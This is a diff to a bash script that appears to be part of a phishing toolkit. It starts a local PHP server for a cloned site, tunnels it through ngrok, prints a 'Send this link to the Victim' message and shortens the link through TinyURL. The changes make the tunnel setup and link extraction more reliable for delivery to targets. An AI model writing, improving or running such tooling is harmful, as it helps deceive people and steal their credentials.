@@ -406,19 +406,44 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-./ngrok http 127.0.0.1:5555  > /dev/null 2>&1 &
-sleep 10
 
+# Check if ngrok authtoken is configured
+if ! ./ngrok config check > /dev/null 2>&1; then
+    printf "\e[1;91m[!] Ngrok authtoken not configured!\e[0m\n"
+    printf "\e[1;93m[!] Run: ./ngrok config add-authtoken YOUR_TOKEN\e[0m\n"
+    printf "\e[1;93m[!] Get token from: https://dashboard.ngrok.com/get-started/your-authtoken\e[0m\n"
+    printf "\e[1;93m[!] Or use option 2 (Localtunnel) instead\e[0m\n"
+    exit 1
+fi
+
+./ngrok http 127.0.0.1:5555  > /dev/null 2>&1 &
+sleep 8
+
+# Try multiple methods to get the link
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok-free\.app")
 if [[ -z "$link" ]]; then
     link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok\.io")
 fi
+if [[ -z "$link" ]]; then
+    link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -oP '"public_url":"https://\K[^"]+')
+fi
+
+# If still no link, show debug info
+if [[ -z "$link" ]]; then
+    printf "\e[1;91m[!] Failed to get ngrok link!\e[0m\n"
+    printf "\e[1;93m[*] Debug info:\e[0m\n"
+    curl -s http://127.0.0.1:4040/api/tunnels | head -20
+    printf "\e[1;93m[!] Make sure ngrok authtoken is configured\e[0m\n"
+    printf "\e[1;93m[!] Run: ./ngrok config add-authtoken YOUR_TOKEN\e[0m\n"
+    exit 1
+fi
+
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
 
 # Try to create shortened link (optional)
-if command -v curl &> /dev/null; then
+if command -v curl &> /dev/null && [[ ! -z "$link" ]]; then
     short_link=$(curl -s "http://tinyurl.com/api-create.php?url=$link")
-    if [[ ! -z "$short_link" ]]; then
+    if [[ ! -z "$short_link" ]] && [[ "$short_link" != "Error" ]]; then
         printf "\e[1;92m[\e[0m*\e[1;92m] Shortened link:\e[0m\e[1;77m %s\e[0m\n" $short_link
     fi
 fi
